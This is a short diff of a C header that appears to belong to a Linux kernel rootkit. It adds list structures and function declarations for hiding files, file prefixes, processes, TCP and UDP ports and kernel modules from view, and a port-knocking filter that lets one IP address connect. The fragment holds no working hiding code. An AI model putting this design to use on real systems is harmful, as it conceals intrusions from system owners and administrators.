@@ -5,6 +5,51 @@
 
 #include "include.h"
 
+/* list for hidden files (full path) */
+struct file_name {
+	struct list_head list;
+	char name[1024];
+};
+
+/* list for hidden files (by prefix) */
+struct file_prefix {
+	struct list_head list;
+	char name[64];
+};
+
+/* list for hidden processes (by pid) */
+struct process {
+	struct list_head list;
+	pid_t pid;
+};
+
+/* list for hidden tcp sockets (by port) */
+struct tcp_socket {
+	struct list_head list;
+	int port;
+};
+
+/* list for hidden udp sockets (by port) */
+struct udp_socket {
+	struct list_head list;
+	int port;
+};
+
+/* list for hidden kernel modules (by module name) */
+// TODO: think of a better way to store hidden modules
+struct modules {
+	struct list_head list;
+	char name[64];
+};
+
+/* list for ports with enabled port knocking */
+struct port_knocking {
+	struct list_head list;
+	int port;		/* the port that is filtered */
+	int protocol;	/* tcp or udp */
+	int ipaddr;		/* the ip that is allowed to connect */
+};
+
 /*
  * Functions for adding and removing certain objects from hiding
  */
@@ -17,6 +62,9 @@ hide_file_path(char *name);
 
 int
 unhide_file_path(char *name);
+
+struct list_head *
+get_prefix_list(void);
 
 int
 is_prefix_hidden(char *name);
